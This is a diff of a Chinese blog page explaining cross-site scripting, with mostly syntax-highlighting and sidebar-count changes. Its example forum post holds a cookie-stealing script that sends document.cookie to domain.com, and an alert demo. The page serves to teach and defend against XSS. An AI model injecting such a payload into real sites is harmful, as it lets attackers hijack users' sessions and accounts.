@@ -467,9 +467,9 @@
       
         <h1 id="一、跨站脚本攻击"><a href="#一、跨站脚本攻击" class="headerlink" title="一、跨站脚本攻击"></a>一、跨站脚本攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
 <h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">location.href="//domain.com/?c=" + document.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>之后该内容可能会被渲染成以下形式：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">location.href="//domain.com/?c=" + document.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
 <h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
 <li>窃取用户的 Cookie</li>
@@ -481,7 +481,7 @@
 <p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p>
 <p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p>
 <p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>XSS Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"q"</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(/xss/);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>XSS Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"q"</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">alert(<span class="regexp">/xss/</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>XSS Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&amp;lt;form&amp;gt;</span><br><span class="line">  &amp;lt;input type="text" name="q" value="test"&amp;gt;</span><br><span class="line">&amp;lt;/form&amp;gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&amp;lt;script type="text/javascript"&amp;gt;</span><br><span class="line">alert(/xss/);</span><br><span class="line">&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p><a href="http://jsxss.com/zh/try.html" target="_blank" rel="noopener">XSS 过滤在线测试</a></p>
@@ -632,7 +632,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">66</span>
+                    <span class="site-state-item-count">74</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -669,7 +669,13 @@
                     
                       
                     
-                    <span class="site-state-item-count">10</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">13</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -862,7 +868,27 @@
                     
                       
                     
-                    <span class="site-state-item-count">88</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">98</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
